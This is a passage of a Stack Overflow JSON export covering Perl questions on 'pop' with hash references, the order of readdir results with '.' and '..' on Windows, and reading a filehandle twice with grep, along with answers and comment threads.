rel=\"nofollow noreferrer\"><code>pop</code></a> needs to be passed an array, not an Hash reference. I think you want <code>my $data = pop @{$data2-&gt;{record}};</code>"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1462915300, "post_id": 37148828, "comment_id": 61836386, "body": "The syntax of the posted code is correct. The error you are getting isn&#39;t a syntax error. Could you provide the error you are getting?"}], "answers": [{"comments": [{"owner": {"reputation": 52, "user_id": 2138592, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c8a4f5b279b56041467e9065e65ce0b3?s=128&d=identicon&r=PG", "display_name": "marat75", "link": "https://stackoverflow.com/users/2138592/marat75"}, "edited": false, "score": 0, "creation_date": 1462914538, "post_id": 37148921, "comment_id": 61835975, "body": "The only problem I have when I try to do my $app = pop @{$data-&gt;{record}}; is that I get an Internal Server error. I kept everything else the same, though."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 52, "user_id": 2138592, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c8a4f5b279b56041467e9065e65ce0b3?s=128&d=identicon&r=PG", "display_name": "marat75", "link": "https://stackoverflow.com/users/2138592/marat75"}, "edited": false, "score": 1, "creation_date": 1462915341, "post_id": 37148921, "comment_id": 61836415, "body": "@marat75, That&#39;s not useful. What error is Perl giving? Probably in your web server log."}, {"owner": {"reputation": 52, "user_id": 2138592, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c8a4f5b279b56041467e9065e65ce0b3?s=128&d=identicon&r=PG", "display_name": "marat75", "link": "https://stackoverflow.com/users/2138592/marat75"}, "edited": false, "score": 0, "creation_date": 1462919013, "post_id": 37148921, "comment_id": 61837780, "body": "Sorry, I just posted the errors from the apache log."}, {"owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "reply_to_user": {"reputation": 52, "user_id": 2138592, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c8a4f5b279b56041467e9065e65ce0b3?s=128&d=identicon&r=PG", "display_name": "marat75", "link": "https://stackoverflow.com/users/2138592/marat75"}, "edited": false, "score": 1, "creation_date": 1462922587, "post_id": 37148921, "comment_id": 61838924, "body": "@marat75 you are aware that pop removes an entry from an array, right?  if you just want to get the last entry without modifying the array, do <code>my $app = $data2-&gt;{record}[-1];</code>"}, {"owner": {"reputation": 52, "user_id": 2138592, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c8a4f5b279b56041467e9065e65ce0b3?s=128&d=identicon&r=PG", "display_name": "marat75", "link": "https://stackoverflow.com/users/2138592/marat75"}, "edited": false, "score": 0, "creation_date": 1462924380, "post_id": 37148921, "comment_id": 61839442, "body": "Yes, but it is getting discarded after this step, so it does not truly matter."}], "tags": [], "owner": {"reputation": 907, "user_id": 6146688, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/8f262dda91bdff7ff11cf7762124764d?s=128&d=identicon&r=PG", "display_name": "Paul L", "link": "https://stackoverflow.com/users/6146688/paul-l"}, "is_accepted": true, "score": 1, "last_activity_date": 1462917480, "last_edit_date": 1462917480, "creation_date": 1462914080, "answer_id": 37148921, "question_id": 37148828, "link": "https://stackoverflow.com/questions/37148828/syntax-errors-while-trying-to-change-a-foreach-loop/37148921#37148921", "title": "Syntax errors while trying to change a foreach loop", "body": "<p><code>$data2</code> is a reference to a hash.  The <code>pop()</code> function takes an array as an argument.  Because <code>$data2</code> references a hash, there is no concept of a \"last\" element to remove.  So you're going to need to rethink what it is you're trying to do.</p>\n\n<p>In your case, the loop was iterating over the array referenced by <code>$data2-&gt;{record}</code>.  You can access the last element of <strong>that</strong> with <code>pop</code>, however:</p>\n\n<p><code>my $app = pop @{$data2-&gt;{record}};</code></p>\n"}], "owner": {"reputation": 52, "user_id": 2138592, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c8a4f5b279b56041467e9065e65ce0b3?s=128&d=identicon&r=PG", "display_name": "marat75", "link": "https://stackoverflow.com/users/2138592/marat75"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 174, "favorite_count": 0, "accepted_answer_id": 37148921, "answer_count": 1, "score": 0, "last_activity_date": 1462921250, "creation_date": 1462913772, "last_edit_date": 1462921250, "question_id": 37148828, "link": "https://stackoverflow.com/questions/37148828/syntax-errors-while-trying-to-change-a-foreach-loop", "title": "Syntax errors while trying to change a foreach loop", "body": "<p>I am very new to Perl and I am trying to learn enough of it to refactor a few lines of legacy code.</p>\n\n<p>Here is a snippet of the code that I have:</p>\n\n<pre><code>my ( $data2 ) = @_;\nforeach $app (@{$data2-&gt;{record}})\n{\n...\n    if ( $app-&gt;{submission_date__required_} )\n    {\n            $datetime = convert_date( $app-&gt;{submission_date__required_}, \"both\" );\n            print $datetime;\n    }\n}\n</code></pre>\n\n<p>What I tried to do is this:</p>\n\n<pre><code>my $data = pop $data2;\nmy $app = $data-&gt;{record};\n\nif ( $app-&gt;{submission_date__required_} )\n{\n    $datetime = convert_date( $app-&gt;{submission_date__required_}, \"both\" );\n    print $datetime;\n}\n</code></pre>\n\n<p>Any explanation of what I am doing wrong and how to achieve what I need (retrieving the last item from the loop and assigning it to $app instead of iterating through the whole loop) would be appreciated.</p>\n\n<p>I have weird errors in the logs and the page won't load. Here is what the error log says:</p>\n\n<pre><code>[Tue May 10 14:55:20 2016] [error] [client xxx.xxx.xxx.xxx] Use of uninitialized value in lc at submitapp.pl line 48.\n[Tue May 10 14:55:20 2016] [error] [client xxx.xxx.xxx.xxx] Use of uninitialized value $notix in print at submitapp.pl line 177.\n[Tue May 10 14:55:20 2016] [error] [client xxx.xxx.xxx.xxx] Use of uninitialized value $store in string eq at submitapp.pl line 249.\n[Tue May 10 14:55:20 2016] [error] [client xxx.xxx.xxx.xxx] Use of uninitialized value $store in string eq at submitapp.pl line 258.\n[Tue May 10 14:55:20 2016] [error] [client xxx.xxx.xxx.xxx] Use of uninitialized value $store in string eq at submitapp.pl line 267.\n[Tue May 10 14:55:20 2016] [error] [client xxx.xxx.xxx.xxx] Use of uninitialized value $operating_mode in string eq at submitapp.pl line 287.\n[Tue May 10 14:55:20 2016] [error] [client xxx.xxx.xxx.xxx] Use of uninitialized value $operating_mode in string eq at submitapp.pl line 300.\n[Tue May 10 14:55:20 2016] [error] [client xxx.xxx.xxx.xxx] Use of uninitialized value $operating_mode in string eq at submitapp.pl line 328.\n[Tue May 10 15:09:10 2016] [error] [client xxx.xxx.xxx.xxx] syntax error at getqbdata.pl line 415, near \"), referer: http://xxx.xxx.xxx.xxx/qb/submitapp.pl?action=Submit\n[Tue May 10 15:09:10 2016] [error] [client xxx.xxx.xxx.xxx] \\t\\tprint\", referer: http://xxx.xxx.xxx.xxx/qb/submitapp.pl?action=Submit\n[Tue May 10 15:09:10 2016] [error] [client xxx.xxx.xxx.xxx] Execution of getqbdata.pl aborted due to compilation errors., referer: http://xxx.xxx.xxx.xxx/qb/submitapp.pl?action=Submit\n[Tue May 10 15:09:10 2016] [error] [client xxx.xxx.xxx.xxx] Premature end of script headers: getqbdata.pl\n</code></pre>\n\n<p>Nevermind, after apache restart #9 it finally worked.</p>\n"}, {"tags": ["perl", "readdir"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 2, "creation_date": 1462912391, "post_id": 37148400, "comment_id": 61834735, "body": "&quot;All the solutions I have seen use regular expressions or if statements for each element in the array and I would rather not use either of those approaches&quot; Why not?"}, {"owner": {"reputation": 8326, "user_id": 53089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/525dac0c4812e8e8753935590b40ddb6?s=128&d=identicon&r=PG", "display_name": "Rob K", "link": "https://stackoverflow.com/users/53089/rob-k"}, "edited": false, "score": 2, "creation_date": 1462913210, "post_id": 37148400, "comment_id": 61835223, "body": "You should take it as significant that all the solutions you&#39;ve found use that approach. A regex that matches leading &#39;.&#39; also allows you to ignore files whose names start with &#39;.&#39;, which is the standard way of hiding files in the `nix world."}, {"owner": {"reputation": 435, "user_id": 1590930, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1946bd3f1654342077ef798550ab0b14?s=128&d=identicon&r=PG", "display_name": "Hans Goldman", "link": "https://stackoverflow.com/users/1590930/hans-goldman"}, "reply_to_user": {"reputation": 8326, "user_id": 53089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/525dac0c4812e8e8753935590b40ddb6?s=128&d=identicon&r=PG", "display_name": "Rob K", "link": "https://stackoverflow.com/users/53089/rob-k"}, "edited": false, "score": 0, "creation_date": 1462913291, "post_id": 37148400, "comment_id": 61835256, "body": "@RobK, I did. That&#39;s why I was asking the question in the first place. :)"}, {"owner": {"reputation": 435, "user_id": 1590930, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1946bd3f1654342077ef798550ab0b14?s=128&d=identicon&r=PG", "display_name": "Hans Goldman", "link": "https://stackoverflow.com/users/1590930/hans-goldman"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1462913432, "post_id": 37148400, "comment_id": 61835332, "body": "@ThisSuitIsBlackNot, I try to avoid regexs whenever possible because they are confusing to read for most people (at least most people I work with, myself included). And if for each iteration seemed like more overhead and more code than was necessary, but apparently, it is necessary."}, {"owner": {"reputation": 8326, "user_id": 53089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/525dac0c4812e8e8753935590b40ddb6?s=128&d=identicon&r=PG", "display_name": "Rob K", "link": "https://stackoverflow.com/users/53089/rob-k"}, "edited": false, "score": 2, "creation_date": 1462913810, "post_id": 37148400, "comment_id": 61835559, "body": "They don&#39;t appear to even exist in the root directory in Windows."}, {"owner": {"reputation": 435, "user_id": 1590930, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1946bd3f1654342077ef798550ab0b14?s=128&d=identicon&r=PG", "display_name": "Hans Goldman", "link": "https://stackoverflow.com/users/1590930/hans-goldman"}, "reply_to_user": {"reputation": 8326, "user_id": 53089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/525dac0c4812e8e8753935590b40ddb6?s=128&d=identicon&r=PG", "display_name": "Rob K", "link": "https://stackoverflow.com/users/53089/rob-k"}, "edited": false, "score": 0, "creation_date": 1462913906, "post_id": 37148400, "comment_id": 61835617, "body": "@RobK, Good catch."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 3, "creation_date": 1462913954, "post_id": 37148400, "comment_id": 61835638, "body": "You don&#39;t have to use a regex: <code>my @files = grep { $_ ne &#39;.&#39; &amp;&amp; $_ ne &#39;..&#39; } readdir $dh;</code> (although any Perl developer should be able to understand simple regexes)."}, {"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "reply_to_user": {"reputation": 8326, "user_id": 53089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/525dac0c4812e8e8753935590b40ddb6?s=128&d=identicon&r=PG", "display_name": "Rob K", "link": "https://stackoverflow.com/users/53089/rob-k"}, "edited": false, "score": 0, "creation_date": 1462914561, "post_id": 37148400, "comment_id": 61835989, "body": "@RobK: <i>Which</i> root directory? Isn&#39;t there one for each mounted device? (` C:\\ <code>, </code> D:\\ `, ...). (Pardon the backticks, I can&#39;t make that come out the way I want it.)"}, {"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 0, "creation_date": 1462914930, "post_id": 37148400, "comment_id": 61836185, "body": "A related question about the C/POSIX <code>readdir()</code> function: <a href=\"http://stackoverflow.com/q/8977441/827263\">stackoverflow.com/q/8977441/827263</a>"}, {"owner": {"reputation": 8326, "user_id": 53089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/525dac0c4812e8e8753935590b40ddb6?s=128&d=identicon&r=PG", "display_name": "Rob K", "link": "https://stackoverflow.com/users/53089/rob-k"}, "reply_to_user": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 0, "creation_date": 1462914932, "post_id": 37148400, "comment_id": 61836186, "body": "@KeithThompson <code>C:</code> definitely. From my brief testing, it appears actual disks don&#39;t have them, network shares mounted as drives do."}, {"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "reply_to_user": {"reputation": 8326, "user_id": 53089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/525dac0c4812e8e8753935590b40ddb6?s=128&d=identicon&r=PG", "display_name": "Rob K", "link": "https://stackoverflow.com/users/53089/rob-k"}, "edited": false, "score": 0, "creation_date": 1462915036, "post_id": 37148400, "comment_id": 61836244, "body": "@RobK: Sure. My point is that <code>C:</code> is not necessarily the only mounted device. Mounting a second drive as <code>D:</code> is not uncommon -- and remember that it&#39;s called <code>C:</code> because <code>A:</code> and <code>B:</code> were commonly floppy drives. Windows, unlike Unix, has no single root directory."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1462917073, "post_id": 37148400, "comment_id": 61837123, "body": "Rob K mean &quot;a root directory&quot;, not &quot;the root directory&quot;. No need to blow this out of proportion. // That said, he&#39;s wrong. A root directory can have <code>.</code> and <code>..</code> in Windows. (e.g. <code>subst z: c:\\users &amp; dir z:\\  &amp; subst &#47;d z:</code>)"}], "answers": [{"comments": [{"owner": {"reputation": 435, "user_id": 1590930, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1946bd3f1654342077ef798550ab0b14?s=128&d=identicon&r=PG", "display_name": "Hans Goldman", "link": "https://stackoverflow.com/users/1590930/hans-goldman"}, "edited": false, "score": 0, "creation_date": 1462913560, "post_id": 37148541, "comment_id": 61835416, "body": "I&#39;ll look into Path::Tiny-&gt;children. Thanks!"}, {"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 0, "creation_date": 1462914801, "post_id": 37148541, "comment_id": 61836117, "body": "If you&#39;re going to use a regex, an alternative that I find slightly more readable is <code>&#47;^\\.\\.?$&#47;</code>."}, {"owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 1, "creation_date": 1462922242, "post_id": 37148541, "comment_id": 61838818, "body": "you apparently don&#39;t have any files named &quot;.\\n&quot; or &quot;..\\n&quot; :)  <code>$</code> is only really useful for matching user or file input; anywhere else, avoid it"}, {"owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "reply_to_user": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 1, "creation_date": 1462923195, "post_id": 37148541, "comment_id": 61839109, "body": "@ysth Although I&#39;ve never seen such a thing in the wild, you are technically correct, <a href=\"https://www.youtube.com/watch?v=hou0lU8WMgo\" rel=\"nofollow noreferrer\">the best kind of correct</a>! Reason #1928 to not roll your own and use Path::Tiny."}, {"owner": {"reputation": 435, "user_id": 1590930, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1946bd3f1654342077ef798550ab0b14?s=128&d=identicon&r=PG", "display_name": "Hans Goldman", "link": "https://stackoverflow.com/users/1590930/hans-goldman"}, "edited": false, "score": 0, "creation_date": 1462923606, "post_id": 37148541, "comment_id": 61839231, "body": "@Schwern, I checked out Path::Tiny and it looks perfect for what I&#39;m doing, but doesn&#39;t seem to be available in ActivePerl. So, I&#39;m probably going to go with your grep solution."}, {"owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "reply_to_user": {"reputation": 435, "user_id": 1590930, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1946bd3f1654342077ef798550ab0b14?s=128&d=identicon&r=PG", "display_name": "Hans Goldman", "link": "https://stackoverflow.com/users/1590930/hans-goldman"}, "edited": false, "score": 2, "creation_date": 1462924494, "post_id": 37148541, "comment_id": 61839476, "body": "@HansGoldman It will work on Windows fine. By &quot;not available for ActivePerl&quot; I assume you mean there&#39;s not a PPM for it? PPM repositories are often incomplete and out of date... but <a href=\"https://code.activestate.com/ppm/Path-Tiny/\" rel=\"nofollow noreferrer\">here it is</a> and it&#39;s even up to date. If it wasn&#39;t there, Path::Tiny is a pure Perl module and can be installed on ActivePerl. Also consider switching to <a href=\"http://strawberryperl.com/\" rel=\"nofollow noreferrer\">Strawberry Perl</a> which comes with its own properly configured compiler and CPAN suite and is compatible with more of CPAN."}], "tags": [], "owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "is_accepted": true, "score": 10, "last_activity_date": 1462922617, "last_edit_date": 1462922617, "creation_date": 1462912733, "answer_id": 37148541, "question_id": 37148400, "link": "https://stackoverflow.com/questions/37148400/perls-readdir-function-result-order/37148541#37148541", "title": "Perl&#39;s &#39;readdir&#39; Function Result Order?", "body": "<p>There is no guarantee on the order of <code>readdir</code>. <a href=\"http://perldoc.perl.org/functions/readdir.html\" rel=\"nofollow\">The docs state</a> it...</p>\n\n<blockquote>\n  <p>Returns the next directory entry for a directory opened by <code>opendir</code>.</p>\n</blockquote>\n\n<p>The whole thing is stepping through entries in the directory in whatever order they're provided by the filesystem. There is no guarantee what this order may be.</p>\n\n<p>The usual way to work around this is with a regex or string equality.</p>\n\n<pre><code>my @dirs = grep { !/^\\.{1,2}\\z/ } readdir $dh;\n\nmy @dirs = grep { $_ ne '.' &amp;&amp; $_ ne '..' } readdir $dh;\n</code></pre>\n\n<p>Because this is such a common issue, I'd recommend using <a href=\"https://metacpan.org/pod/Path::Tiny#children\" rel=\"nofollow\"><code>Path::Tiny-&gt;children</code></a> instead of rolling your own. They'll have figured out the fastest and safest way to do it, which is to use grep to filter out <code>.</code> and <code>..</code>. Path::Tiny fixes a lot of things about Perl file and directory handling.</p>\n"}, {"comments": [{"owner": {"reputation": 435, "user_id": 1590930, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1946bd3f1654342077ef798550ab0b14?s=128&d=identicon&r=PG", "display_name": "Hans Goldman", "link": "https://stackoverflow.com/users/1590930/hans-goldman"}, "edited": false, "score": 0, "creation_date": 1462913069, "post_id": 37148578, "comment_id": 61835154, "body": "I was afraid of that."}], "tags": [], "owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "is_accepted": false, "score": 9, "last_activity_date": 1462912879, "last_edit_date": 1592644375, "creation_date": 1462912879, "answer_id": 37148578, "question_id": 37148400, "link": "https://stackoverflow.com/questions/37148400/perls-readdir-function-result-order/37148578#37148578", "title": "Perl&#39;s &#39;readdir&#39; Function Result Order?", "body": "<p><a href=\"http://www.perlmonks.org/?node_id=112867\" rel=\"noreferrer\">This perlmonks thread from 2001</a> investigated this very issue, and Perl wizard Randal Schwartz concluded</p>\n<blockquote>\n<p>readdir on Unix returns the underlying raw directory order. Additions and deletions to the directory use and free-up slots. The first two entries to any directory are always created as &quot;dot&quot; and &quot;dotdot&quot;, and these entries are never deleted <strong>under normal operation</strong>.</p>\n<p>However, if a directory entry for either of these gets incorrectly deleted (through corruption, or using the perl -U option and letting the superuser unlink it, for example), the next fsck run has to recreate the entry, and it will simply add it. Oops, dot and dotdot are no longer the first two entries!</p>\n<p>So, defensive programming mandates that you do not count on the slot order. And there's no promise that dot and dotdot are the first two entries, because Perl can't control that, and the underlying OS doesn't promise it either.</p>\n</blockquote>\n"}], "owner": {"reputation": 435, "user_id": 1590930, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1946bd3f1654342077ef798550ab0b14?s=128&d=identicon&r=PG", "display_name": "Hans Goldman", "link": "https://stackoverflow.com/users/1590930/hans-goldman"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 229, "favorite_count": 0, "accepted_answer_id": 37148541, "answer_count": 2, "score": 4, "last_activity_date": 1462922617, "creation_date": 1462912260, "question_id": 37148400, "link": "https://stackoverflow.com/questions/37148400/perls-readdir-function-result-order", "title": "Perl&#39;s &#39;readdir&#39; Function Result Order?", "body": "<p>I am running Perl in Windows and I am getting a list of all the files in a directory using readdir and storing the result in an array. The first two elements in the array seem to always be \".\" and \"..\". Is this order guaranteed (assuming the operating system does not change)?</p>\n\n<p>I would like to do the following to remove these values:</p>\n\n<pre><code>my $directory = 'C:\\\\foo\\\\bar';\n\nopendir my $directory_handle, $directory \n    or die \"Could not open '$directory' for reading: $!\\n\";\n\nmy @files = readdir $directory_handle;\nsplice ( @files, 0, 2 ); # Remove the \".\" and \"..\" elements from the array\n</code></pre>\n\n<p>But I am worried that it might not be safe to do so. All the solutions I have seen use regular expressions or if statements for each element in the array and I would rather not use either of those approaches if I don't have to. Thoughts?</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 4173, "user_id": 4450651, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l6IMB.jpg?s=128&g=1", "display_name": "red0ct", "link": "https://stackoverflow.com/users/4450651/red0ct"}, "edited": false, "score": 0, "creation_date": 1462912763, "post_id": 37148265, "comment_id": 61834952, "body": "Do you want to add the result of second <code>grep</code> to array <code>@value</code>?"}, {"owner": {"reputation": 13399, "user_id": 716443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8d13509991dbbd5467f01f55988ae4e?s=128&d=identicon&r=PG", "display_name": "DavidO", "link": "https://stackoverflow.com/users/716443/davido"}, "edited": false, "score": 1, "creation_date": 1462913047, "post_id": 37148265, "comment_id": 61835145, "body": "The first grep evaluates <code>&lt;$fh&gt;</code> in list context, thus exhausing the filehandle. The 2nd grep will find nothing remaining to read from <code>&lt;$fh&gt;</code>.  If you want to perform multiple operations on the same lines from <code>&lt;$fh&gt;</code> you may either need the <code>while(&lt;$fh&gt;){...</code> idiom, or to slurp the file into an array for further processing."}, {"owner": {"reputation": 65, "user_id": 3802685, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/cd9359f1cd3e0e11697847f90f40428f?s=128&d=identicon&r=PG&f=1", "display_name": "user3802685", "link": "https://stackoverflow.com/users/3802685/user3802685"}, "reply_to_user": {"reputation": 4173, "user_id": 4450651, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l6IMB.jpg?s=128&g=1", "display_name": "red0ct", "link": "https://stackoverflow.com/users/4450651/red0ct"}, "edited": false, "score": 0, "creation_date": 1462913248, "post_id": 37148265, "comment_id": 61835242, "body": "@red0ct yes, I am still trying to figure out how to append data to array&#39;s, with no luck or success."}, {"owner": {"reputation": 65, "user_id": 3802685, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/cd9359f1cd3e0e11697847f90f40428f?s=128&d=identicon&r=PG&f=1", "display_name": "user3802685", "link": "https://stackoverflow.com/users/3802685/user3802685"}, "reply_to_user": {"reputation": 13399, "user_id": 716443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8d13509991dbbd5467f01f55988ae4e?s=128&d=identicon&r=PG", "display_name": "DavidO", "link": "https://stackoverflow.com/users/716443/davido"}, "edited": false, "score": 0, "creation_date": 1462913313, "post_id": 37148265, "comment_id": 61835267, "body": "@DavidO I have tried using a <code>while(&lt;$fh&gt;)</code> loop, and it keeps giving me two results. Either it will give me multiple repeats of the same data (I only need  it once), or some of the regex wont work at all. Also it seems as though <code>while</code> loops dont work well with multiple regex&#39;s."}, {"owner": {"reputation": 4173, "user_id": 4450651, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l6IMB.jpg?s=128&g=1", "display_name": "red0ct", "link": "https://stackoverflow.com/users/4450651/red0ct"}, "edited": false, "score": 0, "creation_date": 1462913471, "post_id": 37148265, "comment_id": 61835354, "body": "To append data to array you can use the <code>push</code> instruction like <code>push @value, @newarray</code>. But DavidO is right. There is no data to read in your filehandle after the first grep. Read all data from <code>$fh</code> to array like <code>@data = &lt;$fh&gt;</code> and then try with push if you want"}, {"owner": {"reputation": 65, "user_id": 3802685, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/cd9359f1cd3e0e11697847f90f40428f?s=128&d=identicon&r=PG&f=1", "display_name": "user3802685", "link": "https://stackoverflow.com/users/3802685/user3802685"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1462915314, "post_id": 37148265, "comment_id": 61836394, "body": "@zdim yes <code>m&#47;&#47;g</code> is in there"}], "answers": [{"comments": [{"owner": {"reputation": 32921, "user_id": 5771269, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be6a5b618f5bd197150a6186318beba7?s=128&d=identicon&r=PG&f=1", "display_name": "cdlane", "link": "https://stackoverflow.com/users/5771269/cdlane"}, "edited": false, "score": 0, "creation_date": 1462948903, "post_id": 37148800, "comment_id": 61846510, "body": "Working with just the first pattern, the OP&#39;s version rejects a simple line with &#39;IIIA&#39; by itself but accepts a compound  line with &#39;IIIB IIIC&#39;.  Your version and that of @ikegami accept both.  Until the OP weighs in on what the actual input is, how can you say all these other elements aren&#39;t necessary?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 32921, "user_id": 5771269, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be6a5b618f5bd197150a6186318beba7?s=128&d=identicon&r=PG&f=1", "display_name": "cdlane", "link": "https://stackoverflow.com/users/5771269/cdlane"}, "edited": false, "score": 0, "creation_date": 1462956451, "post_id": 37148800, "comment_id": 61851154, "body": "@cdlane  I added a comment on why those are left out, thank you for prompting that. I get such involved behavior in my tests that I&#39;d call the code in OP either a bug or ill-advised.  Unless it&#39;s play and experimentation, of course."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": 